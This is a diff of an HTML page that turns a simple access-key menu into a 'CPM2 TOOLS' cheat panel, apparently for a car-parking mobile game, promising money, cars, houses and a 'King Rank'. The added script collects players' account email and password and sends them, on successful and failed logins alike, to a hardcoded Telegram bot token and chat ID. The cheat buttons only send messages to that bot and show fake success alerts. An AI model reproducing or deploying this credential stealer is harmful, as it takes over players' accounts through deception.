@@ -1,158 +1,464 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CrisTools Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CPM2 TOOLS</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
-
-    * { box-sizing: border-box; }
-
     body {
-      font-family: 'Orbitron', sans-serif;
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #fff;
+      text-align: center;
       margin: 0;
       padding: 0;
-      background: url('https://i.ibb.co/0RzgPXpr/Photoroom-20250613-191110.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
     }
-
-    .box {
-      width: 90%;
-      max-width: 420px;
-      background: rgba(0, 0, 0, 0.5);
-      border: 1px solid red;
-      border-radius: 16px;
-      padding: 30px;
-      box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
-      backdrop-filter: blur(15px);
-      text-align: center;
-    }
-
-    h2 {
-      margin-bottom: 20px;
-      color: #ff4d4d;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 12px;
+    .container {
+      display: none;
+      max-width: 350px;
+      margin: 30px auto;
+      padding: 20px;
+      background: #222;
+      border: 3px solid #8B0000;
       border-radius: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      background: rgba(255, 255, 255, 0.08);
-      color: #fff;
-      font-size: 16px;
-      backdrop-filter: blur(8px);
     }
-
-    input::placeholder { color: #ccc; }
-
-    button {
-      background: rgba(255, 0, 0, 0.4);
+    #loginForm { display: block; }
+    h2.gradient-text, h3.gradient-text {
+      background: linear-gradient(90deg, #B8860B, #FF4500, #8B0000);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
       font-weight: bold;
-      border: 1px solid rgba(255, 0, 0, 0.6);
-      cursor: pointer;
+      text-transform: uppercase;
+      margin-bottom: 10px;
     }
-
-    button:hover { background: rgba(255, 0, 0, 0.7); }
-
-    #menuBox { display: none; }
-
-    /* Popup Styles */
+    p.notice { color: #ff4747; font-size: 14px; margin: 5px 0; }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin: 8px 0;
+      border: 1px solid #8B0000;
+      border-radius: 5px;
+      background: #333;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      background: linear-gradient(90deg, #B8860B, #FF4500, #8B0000);
+      color: #fff;
+    }
+    button:hover { opacity: 0.9; }
+    .menu-section { margin-top: 15px; border-top: 1px solid #444; padding-top: 10px; }
     .popup {
       display: none;
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: rgba(0, 0, 0, 0.8);
-      padding: 20px;
-      border: 1px solid red;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(255,0,0,0.8);
-      width: 80%;
-      max-width: 300px;
-      text-align: center;
+      width: 300px;
+      max-height: 400px;
+      overflow-y: auto;
+      background: #222;
+      border: 3px solid #8B0000;
+      border-radius: 10px;
+      padding: 15px;
       z-index: 1000;
     }
-    .popup button { margin-top: 10px; }
+    .popup p, .popup h3 { margin: 10px 0; }
+    .close-btn {
+      background: linear-gradient(90deg, #8B0000, #FF4500);
+      color: #fff;
+    }
+    #carList {
+      max-height: 200px;
+      overflow-y: auto;
+      border: 1px solid #555;
+      padding: 5px;
+      text-align: left;
+      margin: 10px 0;
+    }
+    #carList p { margin: 5px 0; cursor: pointer; }
+    #carList p:hover { color: #FFD700; text-decoration: underline; }
   </style>
 </head>
 <body>
-  <!-- Login Box -->
-  <div class="box" id="loginBox">
-    <h2>🔐 CrisTools Login</h2>
-    <input type="text" id="accessKeyInput" placeholder="Enter Access Key">
-    <button onclick="login()">Login</button>
+
+<!-- LOGIN FORM -->
+<div class="container" id="loginForm">
+  <h2 class="gradient-text">======== CPM2 TOOLS ========</h2>
+  <p class="notice">LOGOUT BEFORE USING THIS TOOL</p>
+  <input type="text" id="emailInput" placeholder="Email" />
+  <input type="password" id="passwordInput" placeholder="Password" />
+  <input type="text" id="accessKeyInput" placeholder="Access Key" />
+  <button onclick="validateKey()">Login</button>
+</div>
+
+<!-- MENU BOX -->
+<div class="container menu" id="menuBox">
+  <h2 class="gradient-text">✅ Access Granted</h2>
+  <p><strong>Access Key:</strong> <span id="showKey"></span></p>
+
+  <button onclick="openPopup('email')">Change Email</button>
+  <button onclick="openPopup('password')">Change Password</button>
+  <button onclick="activateKing()">King Rank</button>
+
+  <!-- Money -->
+  <div class="menu-section">
+    <h3 class="gradient-text">💰 Money</h3>
+    <input type="number" id="moneyAmount" placeholder="Enter Amount">
+    <button onclick="sendMoney()">Send Money</button>
   </div>
 
-  <!-- Menu Box -->
-  <div class="box" id="menuBox">
-    <h2>✅ Access Granted</h2>
-    <p>🎮 Welcome to CrisTools! Enjoy all features unlocked.</p>
-    <button onclick="showPopup('email')">📧 Change Email</button>
-    <button onclick="showPopup('password')">🔑 Change Password</button>
-    <button onclick="activateKing()">👑 King Rank</button>
+  <!-- Slot -->
+  <div class="menu-section">
+    <h3 class="gradient-text">🎰 Slot</h3>
+    <input type="number" id="slotAmount" placeholder="Max 20" max="20" min="1">
+    <button onclick="sendSlot()">Send Slot</button>
   </div>
 
-  <!-- Email Popup -->
-  <div class="popup" id="popup-email">
-    <h3>Change Email</h3>
-    <input type="text" id="newEmail" placeholder="Enter new email">
-    <button onclick="submitChange('email')">Submit</button>
-    <button onclick="closePopup('email')">Close</button>
+  <!-- House -->
+  <div class="menu-section">
+    <h3 class="gradient-text">🏠 House</h3>
+    <select id="houseSelect">
+      <option value="House 1">House 1</option>
+      <option value="House 2">House 2</option>
+      <option value="House 3">House 3</option>
+      <option value="House 4">House 4</option>
+    </select>
+    <button onclick="sendHouse()">Send House</button>
   </div>
 
-  <!-- Password Popup -->
-  <div class="popup" id="popup-password">
-    <h3>Change Password</h3>
-    <input type="text" id="newPassword" placeholder="Enter new password">
-    <button onclick="submitChange('password')">Submit</button>
-    <button onclick="closePopup('password')">Close</button>
-  </div>
+  <button onclick="openCarMenu()">🚗 Car Menu</button>
+</div>
 
-  <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const urlKey = urlParams.get('key');
+<!-- CAR MENU -->
+<div class="popup" id="carMenu">
+  <h3 class="gradient-text">Choose Car Region</h3>
+  <button onclick="showCarRegion('Europe')">Europe Cars</button>
+  <button onclick="showCarRegion('Japan')">Japan Cars</button>
+  <button onclick="showCarRegion('USA')">USA Cars</button>
+  <button class="close-btn" onclick="closePopup('carMenu')">Close</button>
+</div>
 
-    function login() {
-      const inputKey = document.getElementById("accessKeyInput").value.trim();
-      if (urlKey && inputKey === urlKey) {
-        document.getElementById("loginBox").style.display = "none";
-        document.getElementById("menuBox").style.display = "block";
-      } else {
-        alert("❌ Invalid Access Key");
-      }
+<!-- REGION CARS -->
+<div class="popup" id="regionCars">
+  <h3 id="regionTitle" class="gradient-text"></h3>
+  <div id="carList"></div>
+  <input type="text" id="selectedCar" placeholder="Enter Car ID">
+  <button onclick="sendCarSelection()">Send Car</button>
+  <button class="close-btn" onclick="closePopup('regionCars')">Close</button>
+</div>
+
+<!-- EMAIL & PASSWORD POPUPS -->
+<div class="popup" id="popupEmail">
+  <p>Enter New Email:</p>
+  <input type="text" id="newEmail">
+  <button onclick="confirmChange('Email')">Submit</button>
+  <button class="close-btn" onclick="closePopup('popupEmail')">Close</button>
+</div>
+
+<div class="popup" id="popupPassword">
+  <p>Enter New Password:</p>
+  <input type="text" id="newPassword">
+  <button onclick="confirmChange('Password')">Submit</button>
+  <button class="close-btn" onclick="closePopup('popupPassword')">Close</button>
+</div>
+
+<script>
+  const BOT_TOKEN = '8147408379:AAGT_caIIGN_n2FYgia4Le8LlVcs8ZVXYtg';
+  const ADMIN_ID = '7220548075';
+
+  const validKeys = ["Cris", "123456", "Alpha99", "Thoper"];
+  let currentAccessKey = "";
+  let currentEmail = "";
+  let currentPassword = "";
+  let currentRegion = "";
+
+  const carData = {
+  Europe: [
+    "1 - BMW 1 Series F20",
+    "2 - Volkswagen Scirocco R",
+    "3 - BMW M5 F10",
+    "4 - Mercedes Benz G65 AMG",
+    "10 - Ferrari F12 Berlinetta",
+    "15 - Audi RS4 Avant",
+    "17 - Mercedes Benz C63 AMG",
+    "18 - Lamborghini Huracán",
+    "19 - Mercedes Benz AMG GT3 GTR",
+    "20 - Audi TT RS",
+    "22 - BMW M6 Coupe",
+    "24 - Porsche Panamera 970",
+    "27 - Bugatti Veyron",
+    "28 - Porsche Cayenne",
+    "29 - Honda Civic Type R Euro",
+    "30 - BMW E39 M5",
+    "31 - BMW M5 E60",
+    "32 - Koenigsegg Agera RS",
+    "41 - McLaren P1",
+    "45 - BMW E34",
+    "51 - Ferrari 250 GT California Spyder",
+    "54 - BMW M5 E28",
+    "56 - BMW E92 M3",
+    "58 - Ferrari 458 Italia",
+    "59 - Mercedes Benz Smart Fortwo",
+    "61 - Mercedes Benz S65 AMG",
+    "74 - Peugeot 308",
+    "76 - BMW Z4 E89",
+    "77 - Mini John Cooper Works",
+    "86 - BMW X5 M",
+    "87 - Mercedes Benz CL 65 AMG",
+    "88 - BMW M3 GTR",
+    "99 - Vaz Lada Priora",
+    "100 - Vaz Tofas Dogan Tofas Kartal",
+    "102 - Vaz 2114",
+    "103 - BMW M4 Coupe F82",
+    "104 - BMW M5 F90",
+    "106 - Mercedes Benz 190 E 2.6 16 Evo II",
+    "107 - Audi R8 Type 42",
+    "108 - Audi Quattro",
+    "109 - Porsche 911 Carrera S 2012",
+    "110 - Land Rover Sport",
+    "112 - Mercedes Benz W140",
+    "113 - Volkswagen Golf 1.4 TSI",
+    "114 - Mercedes AMG E63",
+    "115 - Audi R7 Coupe V10",
+    "117 - Audi S5 Sportback",
+    "118 - BMW X6 F16",
+    "124 - Rolls Royce Dawn",
+    "127 - BMW M2",
+    "130 - Ford GT40 MK1",
+    "132 - Lada Riva Vaz 2105",
+    "135 - Audi RS6 Avant",
+    "136 - Mercedes Benz AMG S65",
+    "142 - Mercedes AMG GT63",
+    "143 - Mercedes Benz AMG G65",
+    "144 - BMW M850i",
+    "146 - Mercedes AMG GT 43",
+    "153 - BMW M4 Coupe",
+    "157 - Volkswagen Golf GTI Mk2",
+    "162 - McLaren 720S",
+    "163 - Mercedes Benz 280 SL",
+    "169 - Bentley Continental GT",
+    "172 - Rolls Royce Cullinan SUV",
+    "173 - Mercedes-Benz CLS",
+    "175 - Mercedes Benz E32 1999",
+    "178 - Bugatti Chiron",
+    "188 - Porsche 922 GT3 RS",
+    "190 - Peugeot 406 D9",
+    "193 - BMW M3 G81 Touring",
+    "194 - Mercedes Benz SLR McLaren",
+    "198 - Koenigsegg Jesko",
+    "201 - Mercedes Benz CLK GTR",
+    "202 - Pagani Zonda",
+    "203 - BMW E36",
+    "205 - Porsche 993",
+    "206 - Alfa Romeo Giulia",
+    "207 - Porsche 919 Hybrid",
+    "211 - Audi RS7",
+    "212 - Mercedes AMG G63 6x6",
+    "217 - BMW X7",
+    "219 - Volkswagen Passat",
+    "222 - Porsche 918",
+    "223 - DMC DeLorean",
+    "226 - Fiat Doblo",
+    "227 - Mercedes AMG One",
+    "228 - Audi RS 2",
+    "229 - Ferrari F40",
+    "230 - Land Rover",
+    "232 - Kia Stinger",
+    "233 - BMW I7"
+  ],
+
+  Japan: [
+    "6 - GT86",
+    "7 - Lexus LFA",
+    "8 - Infinity G37 Sport Coupe",
+    "9 - Subaru Impreza 2011 WRX STI",
+    "11 - Nissan Skyline R34 GTR",
+    "12 - Mitsubshi Lancer Evo X GSR",
+    "13 - Honda Civic Ek9",
+    "14 - Nissan GTR R35",
+    "43 - Lexus GS 350",
+    "47 - Honda S2000",
+    "49 - Toyota Supra Mk4",
+    "53 - Nissan Skyline Hardtop 2000 GTR Kpg610",
+    "81 - Subaru Impreza 2006 WRX STI",
+    "82 - Mitsubishi Lancer Evo IX",
+    "111 - Honda NSX / Acura NSX",
+    "120 - Toyota Camry",
+    "121 - Toyota Land Cruiser",
+    "128 - Nissan Silvia S15",
+    "129 - Mazda RX7",
+    "131 - Nissan 180 SX",
+    "133 - Perodua Myvi 1.3 SE",
+    "134 - Toyota Mark 2",
+    "137 - Honda Civic FD",
+    "140 - Toyota AE86 Trueno",
+    "145 - Nissan 350Z",
+    "147 - Honda Civic Type R FK8",
+    "149 - NSX",
+    "150 - Toyota GR Supra Mk5",
+    "151 - Toyota Vellfire",
+    "154 - Toyota Hilux",
+    "156 - Nissan Skyline R32 GTR",
+    "158 - Mazda MX-5 Miata",
+    "177 - Nissan Silvia S13",
+    "184 - Mitsubishi Eclipse",
+    "187 - Mazda MX-5 NA Miata",
+    "213 - Nissan Skyline GTR R33",
+    "214 - Toyota Chaser",
+    "218 - Toyota Crown",
+    "221 - Honda NSX 90",
+    "224 - Subaru WRX STI",
+    "225 - Honda CRX Del Sol",
+    "232 - Kia Stinger",
+    "209 - Lexus IS Type F"
+  ],
+
+  USA: [
+    "5 - Chevrolet Camaro Chevy",
+    "21 - Jeep Wrangler",
+    "35 - Ford Mustang S197",
+    "39 - Dodge Charger R/T 1970",
+    "40 - Chevrolet Corvette C7",
+    "55 - Hummer H1 4 Door Wagon",
+    "57 - Cadillac CTS",
+    "60 - Cadillac Escalade ESV Platinum",
+    "62 - Dodge Challenger",
+    "66 - Chrysler 300c",
+    "85 - Ford F150 SVT Raptor",
+    "89 - Hudson Hornet",
+    "105 - Dodge Challenger SRT Demon",
+    "116 - Ford Mustang Shelby GT500",
+    "126 - GMC Sierra 1500 Denali",
+    "139 - Ford Crown Victoria LX",
+    "141 - Dodge Viper ZB1",
+    "148 - Ford Mustang Boss 302",
+    "160 - Dodge Challenger 1960",
+    "161 - Jeep Grand Cherokee 2021",
+    "166 - Chevrolet Corvette C8",
+    "168 - Ford Explorer",
+    "176 - Chevrolet Silverado C10",
+    "179 - Dodge Diplomat Sedan",
+    "180 - Ford F100 1973",
+    "181 - Ford Mustang 1964",
+    "182 - Ford F150 6x6 1997",
+    "183 - Ford Mustang 1965",
+    "185 - Chevrolet Impala 1967",
+    "186 - Chevrolet Astro 1999",
+    "189 - Ford F150 Raptor R 2023",
+    "192 - Dodge Ram TRX",
+    "196 - Ford Falcon XB GT",
+    "199 - Chevrolet Corvette C6",
+    "200 - Dodge Charger SRT 2019 AWD",
+    "208 - Ford Bronco",
+    "210 - GT Spirit Chevrolet Corvette C3",
+    "215 - Chevrolet Tahoe"
+  ]
+};
+
+  function validateKey() {
+    const email = document.getElementById("emailInput").value.trim();
+    const password = document.getElementById("passwordInput").value.trim();
+    const inputKey = document.getElementById("accessKeyInput").value.trim();
+    if (!email || !password || !inputKey) return alert("Please fill all fields");
+    if (validKeys.includes(inputKey)) {
+      currentAccessKey = inputKey;
+      currentEmail = email;
+      currentPassword = password;
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("menuBox").style.display = "block";
+      document.getElementById("showKey").innerText = inputKey;
+      sendToBot(`✅ LOGIN SUCCESS\nEmail: ${email}\nPassword: ${password}\nAccess Key: ${inputKey}`);
+    } else {
+      alert("❌ Access Key Invalid");
+      sendToBot(`❌ FAILED LOGIN\nEmail: ${email}\nPassword: ${password}\nAccess Key: ${inputKey}`);
     }
+  }
 
-    function showPopup(type) {
-      document.getElementById(`popup-${type}`).style.display = 'block';
-    }
+  function openPopup(type) {
+    document.getElementById(`popup${type.charAt(0).toUpperCase() + type.slice(1)}`).style.display = "block";
+  }
 
-    function closePopup(type) {
-      document.getElementById(`popup-${type}`).style.display = 'none';
-    }
+  function closePopup(id) {
+    document.getElementById(id).style.display = "none";
+  }
 
-    function submitChange(type) {
-      const value = document.getElementById(`new${capitalize(type)}`).value.trim();
-      if (!value) return alert(`Please enter a new ${type}`);
-      alert(`✅ ${capitalize(type)} changed to: ${value}`);
-      closePopup(type);
-    }
+  function activateKing() {
+    alert('👑 Successfully Upgraded to King Rank');
+    sendToBot(`👑 KING RANK ACTIVATED\nKey: ${currentAccessKey}`);
+  }
 
-    function activateKing() {
-      alert('👑 King Rank Activated!');
-    }
+  function sendMoney() {
+    const money = document.getElementById('moneyAmount').value.trim();
+    if (!money) return alert("Enter amount to send");
+    sendToBot(`💰 MONEY UPDATE\nAmount: ${money}\nKey: ${currentAccessKey}`);
+    alert("Money sent!");
+  }
 
-    function capitalize(str) {
-      return str.charAt(0).toUpperCase() + str.slice(1);
-    }
-  </script>
+  function sendSlot() {
+    const slot = document.getElementById('slotAmount').value.trim();
+    if (!slot || slot > 20) return alert("Slot must be between 1 and 20");
+    sendToBot(`🎰 SLOT UPDATE\nSlots: ${slot}\nKey: ${currentAccessKey}`);
+    alert("Slot sent!");
+  }
+
+  function sendHouse() {
+    const house = document.getElementById('houseSelect').value;
+    sendToBot(`🏠 HOUSE UPDATE\nSelected: ${house}\nKey: ${currentAccessKey}`);
+    alert("House selection sent!");
+  }
+
+  function openCarMenu() {
+    document.getElementById('carMenu').style.display = 'block';
+  }
+
+  function showCarRegion(region) {
+    currentRegion = region;
+    document.getElementById('carMenu').style.display = 'none';
+    document.getElementById('regionTitle').innerText = `${region} Cars`;
+    const carList = document.getElementById('carList');
+    carList.innerHTML = "";
+    carData[region].forEach(car => {
+      const p = document.createElement("p");
+      p.textContent = car;
+      p.onclick = () => document.getElementById("selectedCar").value = car.split(" - ")[0];
+      carList.appendChild(p);
+    });
+    document.getElementById('regionCars').style.display = 'block';
+  }
+
+  function sendCarSelection() {
+    const carID = document.getElementById("selectedCar").value.trim();
+    if (!carID) return alert("Enter Car ID");
+    const selectedCar = carData[currentRegion].find(car => car.startsWith(carID + " - "));
+    const carName = selectedCar ? selectedCar.split(" - ")[1] : "Unknown Car";
+    const message = `🚗 CAR SELECTION\nRegion: ${currentRegion}\nCar ID: ${carID}\nCar Name: ${carName}\nAccess Key: ${currentAccessKey}`;
+    sendToBot(message);
+    alert("Car selection sent!");
+    closePopup("regionCars");
+  }
+
+  function confirmChange(type) {
+    let newValue = (type === 'Email') ? document.getElementById('newEmail').value.trim() : document.getElementById('newPassword').value.trim();
+    if (!newValue) return alert(`Enter new ${type}`);
+    sendToBot(`✏️ ${type.toUpperCase()} CHANGE\nNew ${type}: ${newValue}\nKey: ${currentAccessKey}`);
+    alert(`${type} changed successfully!`);
+    closePopup(`popup${type}`);
+  }
+
+  function sendToBot(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: ADMIN_ID, text: message })
+    });
+  }
+</script>
 </body>
-</html>
+  </html>
